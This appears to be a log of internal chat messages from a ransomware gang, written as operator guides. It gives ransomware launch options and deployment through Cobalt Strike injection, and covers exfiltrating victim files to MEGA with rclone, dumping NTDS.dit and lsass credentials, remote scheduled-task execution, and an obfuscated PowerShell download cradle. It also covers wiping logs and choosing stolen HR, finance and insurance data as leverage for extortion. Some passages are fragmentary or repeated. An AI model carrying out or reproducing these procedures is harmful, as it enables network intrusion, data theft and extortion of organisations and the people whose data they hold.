Message: ```
The structure is the following.
The current composition is divided into groups, each group is assigned a team leader (one or two, depending on the size of the group).
Ateam - team leader rozetka
Bteam - team leaders red and ali
Cteam - team leader steven

Team leaders are responsible for:
1. Issue cases for work
2. Teach, advise, instruct
3. Connect in the process of solving atypical or previously not completed tasks
4. Help with load builds, networking and other technical issues related to software
5. Provide the necessary guides and manuals

The working group is required to:
1. Listen
2. Watch
3. Do
4. Learn
5. Ask questions
6. Follow the guides and instructions, complete the assigned tasks

An example regulation is as follows.
- Got a session
- Removed primary information
- We created a channel in the rocket (everyone has this function), we call the channel the full main domain of the case (for example, google.com microsoft.com), add me + your group's team leaders there
- Uploaded primary information to the channel according to a given template (composition of adfind output domain, list of domain admins, enterprise admins, local admins, kerberos hashes, seatbelt output, sharefinder output, etc.)

We work from 15 to 01
from 19 to 20 we conduct a public analysis of problems in the discussion channel. Any technical questions are also there. For organizational questions - write in a personal.

Message: Guys, there is a tip for everyone who works with networks::
When you have a network with rights - if possible, make yourself several sessions on other machines (preferably server ones, they work 24x7). If your entrypoint machine reboots on which the session is, you can independently return to the network without wasting time as a team lead and you don’t have to sit and wait until the session is raised for you.

First archive the files in zip
```
MegaNZ usage
1) Create folder for files
2) Uploads exe and dll files to created folder
3) Start background MEGAcmdServer.exe
4) Use the commands:
> MEGAclient.exe update --auto=off # disable autoupdate for megacmd
> MEGAclient.exe login login password # init session by creds
> MEGAclient.exe whoami # check connection
> MEGAclient.exe put -q --ignore-quota-warn test.txt # upload file to acc storage [-q background process]
> MEGAclient.exe ls # check remote directory
> MEGAclient.exe logout # end session
> MEGAclient.exe quit # kill MEGAcmdServer.exe
5) Remove special folder for MEGAcmd
6) Remove update task from schtasks:
> schtasks /query /FO list | findstr /i "mega"
> SCHTASKS /TN "\mega\ FULL NAME HERE" /DELETE /F


example:

> MEGAclient.exe update --auto=off
	Automatic updates disabled

> MEGAclient.exe login supertest@mail.test P@$$w0rd
	log in

> MEGAclient.exe whoami
	Account e-mail: supertest@mail.test, check our account

> MEGAclient.exe put -q --ignore-quota-warn C:\temp\test.txt
	upload test.txt

> MEGAclient.exe ls
	test.txt, check what files already uploaded

> MEGAclient.exe logout
	Logging out...

> MEGAclient.exe quit
	close megaclient

> schtasks /query /FO list | findstr /i "mega"
Folder: \MEGA
TaskName: \MEGA\MEGAcmd Update Task S-1-5-10-1145623454-6237456245-1243533621-3000
> SCHTASKS /TN "\MEGA\MEGAcmd Update Task S-1-5-10-1145623454-6237456245-1243533621-3000" /DELETE /F

then you can still check through the tasklist, and use taskkil to kill the mega process

Message: ------------------- IF RDP IN LOCAL IS VERY NEEDED :: HOW NOT TO SLEEP ::
1. Select the server OS, ping, found. Making a listing of dira
``ls \\REMOTE-HOSTNAME\C$\Users``
Sort by Modified. Where there is a fresh touch - it is DEFINITELY IMPOSSIBLE to go under these users, because the following situation will easily arise - you go in, download balls / test something and suddenly this user comes to this PC and sees your work results ... Detect. Cleaning. End of the game.
To do this, select the user who went to this server last year, say.
Do you think the mechanics are clear?
2. Selecting a user from YES that hangs in YES but is almost never used
```shell net group "Domain Admins" /domain```
This is a list of our YES
Next, on the user, we take turns removing the information
``shell net user Administrator /domain``
We are looking for the Last Logon line - that is, when you logged in to the network for the last time (on any of the PCs in the grid)
If there is a date like the month before last, half a year or finally a year - excellent. This is what we need. Most likely, this is either a service account or an admin to which they do not go, and it definitely will not interfere with your RDP.

Such simple tricks will help you not to sleep stupidly on the RDP

3. We do not sit on the RDP, after we have finished - we do Logoff (MANDATORY). Not to be confused with simply closing the RDP window.
=)

no internet, binary burned, firewall



3. Delete the task



shell schtasks /S remote-hostname123 /TN "WindowsSensor15" /DELETE /F



SUCCESS: The scheduled task "WindowsSensor15" was successfully deleted.





Also available with user context. Works with domain\login + password

Everything is the same


     
shell SCHTASKS /s 192.168.97.23 /U "domainad.com\ralexand" /P "Password123" /RU "domainad.com\ralexand" /create /tn "WindowsSensor1" /tr "cmd.exe /c C:\ProgramData\ x64.exe" /sc ONCE /sd 01/01/2020 /st 00:00


shell SCHTASKS /s 192.168.97.23 /run /TN "WindowsSensor1"


shell schtasks /S 192.168.97.23 /TN "WindowsSensor1" /DELETE /F





!!!Do not forget to do after you have received a spawn or inject session into the process, cutting down your process and deleting the binary you entered. So the payload will live much longer

Message: Hello everyone!!! Guys need your advice.

There is a network - an entry point is organized through VPN.
On the network AB WEBROOT + DEF.
I scanned the network - chose server machines and flew there.
I let the encrypted DLL - it does not knock.
I turn off WEBRUT and DEF.
I let the PSh go by.
Ekze - by.
I check everything on another network - everything is OK!
I think MB Ip doesn't like it - I'm changing the koba (already without a certificate).
I generate payloads - I let them go - everything is past.
The target machine looks in the Internet.
Turned off the firewall too.
I change the target machine - I repeat the steps and all without result.

Questions:
1. Why can this happen?
2. What should I do about it?
3. What other options are there for getting a session?

I watched an article on different vpn, including when you raise your vpn or buy from some office. So, the investigation of various structures and the search for a person using vpn from any paid office were discussed, structures can contact this office to provide vpn (which allegedly does not see the log), pay it or, under some other pretext, get your connection ip. The creation of our own vpn was also discussed, but such a question, when we raise our vpn, we also take vpsk from the service, which prevents structures in the same way from finding out from which service this vpn ip and do the same as with a paid office that provides vpn service?

option -y0 required otherwise sqlcmd cuts output

then take this code

		return;
	}
	private static void Main(string[] args)
		{
			Decrypt("optional username","hash from sqlcmd output here");
		}
}
}

for each hash, a separate call to the Decrypt function

build c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe veeam.cs

upload the resulting exe to the server with veeam and run

Message: ```Launch options:
-m[all/net/local]
all - Encrypt all (Default)
net - only encrypt network resources
local - only encrypt local files

usage example:
lock.exe -m all or lock.exe
lock.exe -m local
lock.exe -m net

run example:
lock.exe -h C:\hosts.txt

-nomutex
Disables mutex protection against double triggering.

-size[10/15/20/25/30/35/40/45/50/60/70/80]
This parameter determines how much % of the file will be encrypted (50% by default), the file is encrypted in different places in chunks.
In this case, databases are encrypted by 100%, vm files by 20%, regardless of the parameter value.

example:
lock.exe -size 35

-p[path]
When using this parameter, the locker will encrypt files at the specified path
It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.

example:
lock.exe -nomutex -p C:\path
lock.exe -nomutex -p C:\path2
lock.exe -nomutex -p \\host\path

-log [path to log file]
Enables error logging
Usage example:
lock.exe -log C:\log.txt

All parameters can be combined with each other, the order is not important. If the locker is launched through the command line, then run it as an administrator (If you have rights).

Hello! those who are downloading files. and it will be useful for everyone! very cool thing, RCLONE
no need for any 7za and mega unarchiving now! everything is very quiet and imperceptible!
times, I don’t know how to write very much)
download rklon from the site. We put rclon.exe in the dira we need, then everything is according to the manual. I did everything through rdp
register a mega, choose it from a huge list that rklon provides us with. rklon quietly cuts to mega and makes a clone of what you need. you can at least just fs. downloads everything through rklon, so the download speed is high.

here is the guide. everything is simple here
https://rclone.org/mega/

next download command

rclone.exe copy "\\FS\" remote:NT -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

remote:NT - only change this.
"remote" is the name of your mega.
"NT" is your directory in the mega where it will be downloaded, if it does not exist, it will create it itself.

example

rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
```

Message: Friends, I want to wish everyone a Happy New Year.
We have done a lot of work this fall. Everyone, both beginners and more experienced members of the working groups, grew professionally, those who lacked perseverance or a technical base left us naturally, we wish them only success in other endeavors.
All those who have passed the difficulties of mastering new tasks remain with us next year, and, I am sure, they will continue to develop, learning new things and expanding the horizons of perception = )
Every month the resourcefulness and quality of work only grows. 2021, in my opinion, will be a landmark year :-) After the holidays, we are waiting for small changes and improvements, but none of them will be controversial.
All good fellows. Thanks to all!

ATTENTION: Everything described in this channel is not subject to distribution, copying or publication on any third-party resources.

Things worth remembering and knowing.
1. A separate build is always generated for each grid, which you need to request by calling @alter in the conf.
2. In the standard package, the build is issued as an archive that contains an .exe file and two .dll files with different bitness for fileless launch through cobalt sessions.
3. At the moment, fileless launch bypasses the vast majority of known AV/EDR systems, and no speed loss has been noticed.

Launch parameters:

-m[all/net/local]
all - Encrypt all (Default)
net - only encrypt network resources
local - only encrypt local files

usage example:
lock.exe -m all or lock.exe
lock.exe -m local
lock.exe -m net

run example:
lock.exe -h C:\hosts.txt

-nomutex
Disables mutex protection against double triggering.

-size[10/15/20/25/30/35/40/45/50/60/70/80]
This parameter determines how much % of the file will be encrypted (50% by default), the file is encrypted in different places in chunks.
In this case, databases are encrypted by 100%, vm files by 20%, regardless of the parameter value.

example:
lock.exe -size 35

-p[path]
When using this parameter, the locker will encrypt files at the specified path
It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.

example:
lock.exe -nomutex -p C:\path
lock.exe -nomutex -p C:\path2
lock.exe -nomutex -p \\host\path

-log [path to log file]
Enables error logging
Usage example:
lock.exe -log C:\log.txt

All parameters can be combined with each other, the order is not important.

Running as a dll via cobaltstrike

Put the files inject.cna massinjector.cna inject_x86.o and inject_x64.o in one folder.
Load file inject.cna cobaltstrike -> script manager -> load

An example of launching within a single machine where there is a session:
mandllinject c:\path\locker.dll

Arguments are passed in quotes
mandllinject c:\path\locker.dll "arguments here"

An example of running at once on X machines where there is a session:
We select the necessary sessions in a "pack", press RMB and select dllinject from the menu
In the dialog box that appears, specify the paths to the dlllocker of the necessary bitness and arguments (if any) and confirm.


NOTE:
It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.
NOTE
this is due to the inclusion of noumutex !!!

- What does it mean?
This means that either you can run the locker with the -nomutex flag any number of times with a path, but there should not be a running locker process WITHOUT a path specified until the "specified" paths are fully processed.

The current version of cobalt is patched with a Java hook where a trial EICAR fingerprint was taken.
Requires jdk13 on Windows to run:
Add this to the batch file
	@echo off
	pushd %~dp0
	set PATH="C:\Program Files\Java\jdk-13.0.2\bin\"
	
To run on ubuntu:
start line
	java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -javaagent:hook.jar -jar cobaltstrike.jar $*

installing the required Java:
	sudo add-apt-repository ppa:linuxuprising/java
	sudo apt install oracle-java15-installer
	
	java-version
	java version "15.0.1" 2020-10-20
	Java(TM) SE Runtime Environment (build 15.0.1+9-18)
	Java HotSpot(TM) 64-Bit Server VM (build 15.0.1+9-18, mixed mode, sharing)

For those with Kali (Debian):
https://www.linuxuprising.com/2020/09/how-to-install-oracle-java-15-on-ubuntu.html

there will be a section below
Install Oracle Java 15 on Ubuntu, Debian, Linux Mint, Pop!_OS, Zorin OS and others using an APT PPA repository

Included in a folder
	Cobalt42_v2/Toolkits/artifact/brooks-artifact-kit/
there is an artifact.cna that needs to be imported into cobalt to generate internal native loads and staged loads to run.

At the moment, the situation with detections is as follows:
https://dyncheck.com/scan/id/eeab696158db737d90da83a0ebf7bc53 - x64 dll
https://dyncheck.com/scan/id/f656a34930eb682d6cab252798234f7c - service-exe-x64
https://dyncheck.com/scan/id/32c29f3ba498be4915bb72d4bae824ce - staged payload x64

All these loads are used not only for manually launching files, but also for jump functionality.
Enjoy, give feedback, wait for updates and patch notes.
Thanks to all.

Artifact Whale is used in the following cases:
	* Attacks -> Packages -> Windows Executable
	* Attacks -> Packages -> Windows Executable (S)
	* Attacks -> Web Drive-by -> Scripted Web Delivery (bitsadmin and exe)
	* Beacon's 'elevate svc-exe' command
	* Beacon's 'jump psexec' and 'jump psexec64' commands
```

Message: *Mega is a cloud storage and file hosting service known for its security feature where all files are encrypted locally before they are uploaded. This prevents anyone (including employees of Mega) from accessing the files without knowledge of the key used for encryption.* In general, as I understand it, all files are encrypted locally before being dumped, so there is no need to make encrypted archives.

Message: ``` guys, I'm telling you how to use rklon:
1. download the program itself (laid out in general), create a file rclone.conf and put it in the same folder with exe
2. then open cmd from the admin, fall into the folder where the program with the configuration file lies and execute the command: rclone config
3. then a menu pops up in which we create a config (roughly speaking, we roll in mega credits), after the credits are rolled in, the program writes them to the rclone.conf file, in encrypted form.
4. we take the received rclone.conf file and the program itself and put it on the host from which we are going to pull the information, of course it’s better to put it in a secluded place
5. we fall into the folder where we put the config and the program and execute the command:

shell rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

well, here I think it’s clear that what’s in quotes is what we’re extorting, we can specify it as you like, even the entire disk
remote - the name of the config, which we specified when performing step 3, data - the folder in the mega where the info is uploaded

Regulations for submitting a case and working with data:

1. Upon completion of the lock, we issue information in the corresponding configuration in the following form

	https://domain.com
	100 Servers 1000 Workstations

	Mega:
	guerillamailaccount@sharklasers.com
	ComPl3xAndh3@vyP@s))91

	200 GB (here we indicate the amount of data in unzipped form, if this type is not clear, we mark COMPRESSED)

	COMPANY NAME creates elite transgender sex dolls for the US presidential administration.

2. After that, in the near future we set the data to merge from the mega and prepare the Data-pack in parallel

3. Data-pack is delivered as follows

	full-listing.txt - full listing of all files downloaded from mega
	30percentlisting.txt - 30% off full listing with focus on HR/Finance folders/database tables with private information
	datapack-example.zip - a small archive containing files from 30percentlisting.txt with priority on files containing confidential information, document scans, HR documents, closed company projects (the archive is small, weighing 10-30 megabytes)

4. Insurance. In the process of data retrieval and in the process of parsing, we are looking for files containing cyber insurance conditions, standard search tags

	Cyber
	policy
	insurance
	endorsement
	supplementary
	underwriting
	terms
	
	If such files with the content of insurance conditions are found, we MUST upload them separately to the channel upon completion of the case, they are an IMPORTANT subject of bargaining.

The presence of files on the network indicating the GDPR significantly increases the success of the payment, this is the standard that is adhered to in storing user data, the company will face significant fines for their leakage.
Please pay attention to this abbreviation in the process of work and in the process of uploading the listing of files and indicate this in the submission of the report.
	
5. What data should you pay special attention to?
	
	Databases containing information such as: email addresses / names / surnames / addresses / payment cards / DOB / SSN / Drivers License (all such DBMS must be exported and sample records from these DBMS are contained in the Data-pack).
	Files and databases relating to company employees (they almost always contain private information similar to the one described above)
	Content of mail servers (correspondence is a very strong pressure factor, uploading the contents of mailboxes of the control link is IMPORTANT if this is uploaded - it is worth mentioning separately with a listing of employees and their positions whose mail archives are uploaded)
	Contents of Accounting/Finance/HR/Projects/Confidential folders
	Sources of software, if it is developed in the company
	
6. 	Data from the mega must be downloaded entirely to a dedicated server

Message: @all Friends, the amount of experience accumulated together exceeds the capabilities of normal and structuring storage, it was decided to raise a simple forum engine to publish relevant guides and materials there that we all get in the process of work.
A big request to everyone! In your free time - write to me for registration, and after it - write down some article there, on the topic in the PM we will decide who can do what.
The forum will not be used as some kind of chat room, more like storing and replenishing the knowledge base, it will be useful for everyone, I tried to divide the navigation by topic for the time being and put the approximate headings of the first articles where we will port the material.

Be responsible, you can’t even imagine how many questions of the same type are asked to each other every day! We can seriously save time for ourselves and our colleagues!

we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
almost certainly they are already there, if not, we do it ourselves
```
net start Volume Shadow Copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```
further in the listing of shadow copies we find the latest
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
accordingly we need a copy number for the next command
```
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c :\temp\log\"

in c:\temp\log\ files ntds.dit / security / system should fall
we take a portable console 7z and pack it into an archive with a password
```
7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
```
we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following
```
Esentutl /p C:\log\ntds.dit

Message: Accessing a server with Shadow Protect SPX backups (StorageCraft)
```
==
1. We go via RDP to one of the servers, in my case it is a SQL server.
2. on the desktop we see the icon of the ShadowProtect SPX software
	-> click on it
3. gui opens (if it asks for credits, enter those under which you entered via RDP, or any other YES)
4. On the left in the "Job Summary" block, we see a detailed description of the backup scheme
	in the "Name" field - the name of the backup of our server
	in the "Destination" field - the place WHERE our spx stores the backups, in the form of SERVA_BA_NAME (SHARE WITH BACKUP ON THIS SERVER)
		From our example, we can conclude that all backups are stored in a ball called StorageCraft, and folders with server backups are named after the name of the server itself.
5. Knowing the name of the backup server, we want to get a better idea of its structure, first of all we get the balls with the command "cmd.exe> net view \\COH-DSS3 /ALL", in response we get "Error 5: Access Denied"
6. There is no access, we try to knock with other accounts YES - the answer is the same - error n 5, it would be logical to assume that in order to access the server we need either local admin credits on this very server, or a special user account with dedicated rights
7. Suppose that if this is a dedicated user, then it has a name similar to the software\function:
	iterate over logins with the occurrence of substrings (here we need to turn on fantasy):
		Storage
		Shadow
		Protect
		Craft
		SP
		SPX
		Backup
		BUUser
		ETC.
	then we do a search on ntds.dit (hashes.txt.ntds) to find the hash, in my case the search was successful and I found the user Humanity.local\SPAdmin (I think it’s clear that this is Shadow Protect Admin) and its hash ce31b806821bec116ba03132ab5b3138, BUT unfortunately the search on cmd5.org did not give any result, and I desperately need a clearpass. (If you have enough hash, then congratulations - you have reached the result)
8. But if you still need a clearpass or you could not find a suitable user, we will understand that if the software somehow knocks on the server, then the credits are known to it, which means they could remain on the server.
	Trying to dump hashes
	I won’t describe in detail here how to do it, but you should try hashdump (and its legitimate analogues) and logonpasswords (and analogues)
	In my case, I used a mimic and dumped lsass, in which I found a clearpass from my SPAdmin account - kerberos:
* Username : SPAdmin
* Domain : COHBackup
* Password : Backup!User
(in my case, for some reason, the domain was not Humanity.local but COHBackup, although you can also knock on Humanity.local (replace with your own value))
9. We go to the explorer, and open the necessary share "\\COH-DSS3\StorageCraft" through it, it asks me for credits, I enter COHBackup\SPAdmin and Backup!User and successfully get access
10. Also in some grids there may be several backup servers, as an option to check this, this is to click on the Backup button in the upper left corner of the gui (immediately after File) then - Destinations -> and we will see what are the ways to save backups
===
I'm not sure if this method will work for everyone, but in my case it worked, good luck!

	there we find on which port it is spinning | sqlserver.exe | and specify it after localhost in this way - | localhost,12345 |

	1.2.2. Output to cmd all databases on the server with size in megabytes
sqlcmd -S localhost -E -Q "SELECT d.name, ROUND(SUM(mf.size) * 8 / 1024, 0) FROM sys.master_files mf INNER JOIN sys.databases d ON d.database_id = mf.database_id WHERE d .database_id > 4 GROUP BY d.name ORDER BY d.name;"


2. Unloading the 100 most saturated in terms of the number of rows of tables in the database, the number of rows and the size of the tables on the hard drive
sqlcmd -S localhost -E -Q "USE %databasename% SELECT TOP 100 s.Name AS SchemaName, t.Name AS TableName, p.rows AS RowCounts, CAST(ROUND((SUM(a.total_pages) / 128.00), 2 ) AS NUMERIC(36, 2)) AS Total_MB FROM sys.tables t INNER JOIN sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p .index_id INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id INNER JOIN sys.schemas s ON t.schema_id = s.schema_id GROUP BY t.Name, s.Name, p.Rows ORDER BY RowCounts desc, Total_MB desc ;"

3. Counting rows in a specific table of a specific database
sqlcmd -S localhost -E -Q "select count(*) from %databasename%.dbo.%tablename%;"

4. Unloading the first 10 records in a specific table of a specific database
sqlcmd -S localhost -E -Q "select top 10 * from %databasename%.dbo.%tablename%;"
sqlcmd -S localhost -E -Q "use %databasename%; select top 10 * from %tablename%" -W

5. Search by column names in a specific database using the example of %pass%
sqlcmd -S localhost -E -Q "select COLUMN_NAME as 'ColumnName', TABLE_NAME as 'TableName' from %databasename%.INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME like '%pass%';"

6. Uploading the data of the contents of specific columns from a specific table to a txt file in a folder (in this example, by the numerical value of the table> date
sqlcmd.exe -S localhost -E -Q "select UserKey, EmailAddress, RealName, Phone, FirstName, LastName, CountryName, CreatedDate from %databasename%.dbo.%tablename% where CreatedDate > '2017-11-30';" -W -s"|" -o "C:\temp\123.txt"

7. Displaying all tables of a specific database
sqlcmd -S localhost -E -Q "use %databasename%; exec sp_tables" -W

8. Backup database
sqlcmd -S localhost -E -Q "BACKUP DATABASE name TO DISK='C:\PerfLogs\name.bak'"


for a remote/another local server, change localhost to ip,port
as an option - localhost,%port% (see netstat)
+
9. to select a non-standard port for mssl, write the address, port = localhost, 52541 example
+

Message: and another moment, because I heard from viola that someone did not start the session gopher ps script, this also applies to other ps1 scripts, and to those situations when a server without powershell ISE
Example: there is a script
```
examplescript.ps1
```
and in the manual on the github, the launch is indicated as:
```
. .\examplescript.ps1
```
and then the command
```
Invoke-ExampleScript -argument
```
you run it and it gives you an error that there is no cmdlet, this is because the cmdlets do not pull up like that (it didn’t work for me in any case)
this is solved in the following way, change the file extension from .ps1 to .psm1 - we get the powershell plug-in
open regular powershell
write
```
Import-Module .\examplescript.psm1
```
call the function with the next command
```
Invoke-ExampleScript -argument
```
get a working script

specify the protocol explicitly, since the port is not explicit, it will be indicated in the output, for example, here is the output of my sessiongofer:
```
"COHLAPTOP75\CSoh","Shopbop - Development","z3M>uE/B","sftp.amazonsedi.com","2PD11LSYEWJ90","Use SFTP","2222"
```
if you just enter in the host field - sftp.amazonsedi.com you will not connect because the port is not sssh 22 but 2222, you need to specify the protocol in the host explicitly tobish sftp://sftp.amazonsedi.com
if specified - ```
Use FTP over TLS if available","21"
```
then specifies ftps://hostname
and so on, here's a reminder just in case:
```
ftp:// - for normal ftp connection
sftp:// - ssh ftp connection
ftps:// - ftp over ssh (implicit)
ftpes:// - ftp over ssh (explicit)

pressing spread opens a window with 5 fields
1 In the first field, you must select the path to the artifact file for creating sessions or the exe/bat/dll file for the payload
2 The wmi/plsexec method is selected in the combobox
3 In the third field, the file download path is written by default, it is "C:\ProgramData"
4 In the fourth field, select the path to the ip/host list
5 Arguments are entered in the start line, if there are no arguments, you just need to click Run Spread
6 By pressing the Run Spread button, a request is made to the domain controller ip / host from the list; in response, addresses to target hosts are received
7 Generates a UNC path to the given directory
8 The paths are sent to the download function and it loops to download the selected file.
9 After a pause of 10 seconds (it can be adjusted), in order to be sure that the file is in the selected directory, the launch command is sent with arguments (if they were specified)

Message: Noticed the following bug
Lokaem, for example, servers through the mount after stopping the database and services through the batch file handler.bat
Lokaem like this
locker.exe -nomutex -m net -size 20 -p \\host\c$
We get the following situation at the output:
the locker goes over the entire disk, but in 90% of cases (like this) it skips the diru with .mdf
C:\Program Files\Microsoft SQL Server\MSSQL12345\Data\database.mdf

At the moment, I strongly recommend that everyone first remove the tasklist en masse and see where the .mdf is located and localize the whole folder with dira above

Locate like this:
```locker.exe -nomutex -m net -size 20 -p "\\host\c$\Program Files\Microsoft SQL Server\MSSQL12345"
```
The remote path MUST be in quotes, because without quotes it will be a syntax error. If everything is ok, then the locker takes the files for processing almost immediately and by the date of the change, this can be seen immediately

it’s just that I have the rklon itself and the config file in place, and the account is blocked, usually, if the rklon is fired on the network, then you won’t find it later, because. it is deleted, and here everything is in place and the account is in the block.

Message: @all who decrypts hashes?
There are a couple of craftsmen, but maybe we can synchronize all contacts, services, farms so that all this goes more efficiently?
The idea is this - to give a dozen hashes to online services and see the output, where it gets confused - it means the service is really cool, similarly with bruters from different forums
We could make 10 services, then make top 3 and work with them all the time
In raising rights, this plays a very important role.

where these locales go, admins don’t go, there is a server, domainadmins hang there, but there we only have a hash for the admin’s locale, and it doesn’t open a psychic session, it freezes and hangs for a long time
but you can go there not local admin

maybe there is some way to legitimately put on the admin hash? otherwise there is no right to dump lsas

Advise the actual method of crypt psh.
I knew one but now for some reason he does not plow.
I took psh, uploaded it to pastebin, made a raw link, inserted it into the command
iex((new-object net.webclient).downloadstring('https://pastebin.com/raw/RjWXyfCW'))
ran it through the ps1 program, she recoded it from 7627 to 250 characters, added the resulting code to
powershell -nop -w hidden -encodedcommand .....
And it turned out a short line that pulled cars through kmd without detecting the defender and aveshek, it also worked through wmic
I found similar sites where there is raw, but they do it with a script and the session does not come.
All good)

If megasync lags, does not allow you to download the archive or the speed is very low, then you can upload the archive through the same rclone

rclone.exe move remote:archive E:\ -P --multi-thread-streams 12 --transfers 12

where remote is the name of the config, archive is the name of the folder, E:\ is the folder where the archive will be dumped, -P shows download progress, to not see any progress changes to -q, --multi-thread-streams and transfers for high download

helped a lot to cope with anomalies in the form of 200kb / s and when the archive is downloaded 500 times and as a result is not saved to disk

tell me, I'm doing a date deletion log, I'm executing the command
```erase /F /S /QE:\FTP\targetname >> erase_all.txt```

because there are files with too long path
command execution is interrupted by an error like "file path is too long"
I found a topic on stackoverfall with a similar problem, they advised me to map the folder and apply the delete command to the linked folder.
I did everything, everything was deleted, but the log of deleted files was not saved

Tell me, mb someone has already encountered this, how to solve it?

1. Install the metasploit
	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
		
		; ./msfconsole run metasploit

2. Install PostgreSQL
	
	apt-get -y install postgresql
	
3. Install Armitage

	wget http://fastandeasyhacking.com/download/armitage150813.tgz
	tar zxvf armitage150813.tgz

4. Initialize the base metasploit

	msfdb init

		; msfdb reinit - Deletes and reinitializes the database.
		; msfdb delete - Deletes the database.
		; msfdb start - Starts the database.
		; msfdb stop - Stops the database.
		; msfdb status - Shows the database status.

	export MSF_DATABASE_CONFIG=/home/%username%/.msf4/database.yml

5. Launch Armitage Teamserver

	cd /path/to/armitage
	./teamserver [external IP address] [password]

From: red
Message: ```
1. Take debian or ubuntu dedic (ssh username@hostname)

Check for postgresql

sudo apt install postgresql

sudo apt-get -y install postgresql

================================================= ================================================= =========================
2. Download and install the metasploit
     
x64
wget http://downloads.metasploit.com/data/releases/archive/metasploit-4.16.2-2020011301-linux-x64-installer.run
      
Next suitcase (allow scripts to run)

chmod +x metasploit-4.16.2-2020011301-linux-x64-installer.run

chmod +x metasploit-4.13.0-2017022101-linux-x64-installer.run

Next install ./metasploit-4.16.2-2020011301-linux-x64-installer.run


https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run

================================================= ================================================= =========================
3. We leave all the default ports and prescribe a random local domain

addada.com domain

================================================= ================================================= =========================
4. After installing the MSF

Installing the editor

sudo apt install nano

Editing scripts 1

nano /etc/init.d/metasploit

#exec /opt/metasploit/ctlscript.sh "$@"
exec /opt/metasploit/postgresql/scripts/ctl.sh "$@"

Editing scripts 2

nano /etc/rc.local add these lines before exit 0

ln -sf /dev/null /var/log/wtmp
ln -sf /dev/null /var/run/utmp
ln -sf /dev/null /var/log/lastlog
ln -sf /dev/null /var/log/auth.log
ln -sf /dev/null /var/log/btmp
ln -sf /dev/null /var/log/dmesg
ln -sf /dev/null /var/log/faillog
ln -sf /dev/null /var/log/kern.log
ln -sf /dev/null /var/log/syslog
ln -sf /dev/null /var/log/user.log
ln -sf /dev/null /var/log/secure
ln -sf /dev/null /root/.bash_history

iptables -A INPUT -i eth0 -p tcp -m tcp --dport 3790 -j DROP
================================================= ================================================= =========================
5. We put the reality so that the armitage works

apt-get update && apt-get upgrade

apt-get install default-jdk
================================================= ================================================= =========================
6. Download and unpack armitage (teamserver) from this url (tgz archive is up-to-date)
wget http://fastandeasyhacking.com/download/armitage150813.tgz
tar zxvf armitage150813.tgz
================================================= ================================================= =========================
7. Change the port in the armitage (before launch) in the teamserver script towards the end of the file

nano armitage/teamserver
================================================= ================================================= =========================
8. Open screen (so that you can run armitage in the background and exit the server), and execute

apt-get install screen

run screen

cd /root/armitage && ./teamserver IP PASS
================================================= ================================================= =========================
9. We wait until everything starts up and a message appears with credits for armitage, and exit the screen using the Ctrl + a combination and then separately d
================================================= ================================================= =========================
10. Change SSH password (passwd root ...)
================================================= ================================================= =========================
11. (change ssh port / do authorization by key on a server)

nano /etc/ssh/sshd_config
================================================= ================================================= =========================

Message: or here, for example, the 3rd symptom, we have two hosts, one of which was mentioned above where everything starts up and works fine, let it be host1 and host2 where remote commands do not go, but you can only go via rdp and run it through the console 
for example, let's take a batch file on host2 . So when I go to host2 via rdp and try to correct / change the text of the batch file or just delete it, it says that I don’t have permission to do this (the batch file is in programdata according to the classics), but if I go to host1 and in the file browser I go to \ \host2\C$\programdata then I can easily delete that batch file or copy a new one from host1

Message: The Lord needs advice. What could it be ?
symptoms :
1st There is an account YES which normally goes everywhere. When you try to remotely execute commands under this account (I tried psexec and wmic), it gives out "access denied" but by going to the rdp and starting the same batch file, for example, everything starts up fine.

2nd There is a session from this user on one of the hosts where everything works fine when connecting to other hosts via rdp (tried 5-7 hosts) and closing the rdp session window, the account is logged out. Roughly speaking, I cannot start the process and close the rdp window , the process will only run when the rdp session is active.
Despite the fact that on one host, as I indicated above, this is not observed.
What could it be? Tricky GPO settings? Why can I execute commands via RDP, but I can’t use remote tools,
On one host, the account works fine and when closing the rdp window, the processes work, but on other hosts a "logout" occurs
 
PS Maybe some glitch? I couldn’t randomly choose the one on which everything works well from 100+ hosts at the beginning

Message: or here, for example, the 3rd symptom, we have two hosts, one of which was mentioned above where everything starts up and works fine, let it be host1 and host2 where remote commands do not go, but you can only go via rdp and run it through the console 
for example, let's take a batch file on host2 . So when I go to host2 via rdp and try to correct / change the text of the batch file or just delete it, it says that I don’t have permission to do this (the batch file is in programdata according to the classics), but if I go to host1 and in the file browser I go to \ \host2\C$\programdata then I can easily delete that batch file or copy a new one from host1

Message: The Lord needs advice. What could it be ?
symptoms :
